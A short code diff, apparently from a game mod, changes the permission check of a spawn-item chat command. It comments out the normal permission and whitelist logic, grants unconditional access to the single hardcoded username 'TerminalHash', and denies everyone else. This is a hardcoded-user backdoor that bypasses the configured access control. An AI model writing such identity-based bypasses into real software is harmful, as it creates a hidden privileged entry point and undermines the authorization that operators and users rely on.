@@ -143,10 +143,14 @@ class GiveCirnu : BlobCommand
 
 	bool canPlayerExecute(CPlayer@ player)
 	{
-		return (
+		if (player.getUsername() == "TerminalHash") {
+			return true;
+		}
+		/*return (
 			ChatCommand::canPlayerExecute(player) &&
 			!ChatCommands::getManager().whitelistedClasses.empty()
-		);
+		);*/
+		return false;
 	}
 
 	void SpawnBlobAt(Vec2f pos, string[] args, CPlayer@ player)
